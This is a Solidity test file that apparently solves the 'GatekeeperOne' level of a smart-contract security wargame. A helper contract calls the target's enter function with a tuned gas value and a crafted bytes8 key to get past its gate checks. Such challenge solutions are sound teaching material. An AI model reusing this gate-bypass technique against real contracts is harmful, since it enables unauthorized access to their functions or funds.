// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {GatekeeperOneFactory} from "../src/levels/13-GatekeeperOneFactory.sol";
import {GatekeeperOne} from "../src/levels/13-GatekeeperOne.sol";

contract Caller {
    function enter(GatekeeperOne target, bytes8 key) external {
        target.enter{gas: 24989}(key);
    }
}

contract GatekeeperOneSolution is BaseTest {

    function solution(address payable target_) internal override{
        GatekeeperOne target = GatekeeperOne(target_);
        // I know the address being pranked is
        // 0x0000000000000000000000000000000000000539
        (new Caller()).enter(target, 0x0100000000000539);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new GatekeeperOneFactory()));
    }
}
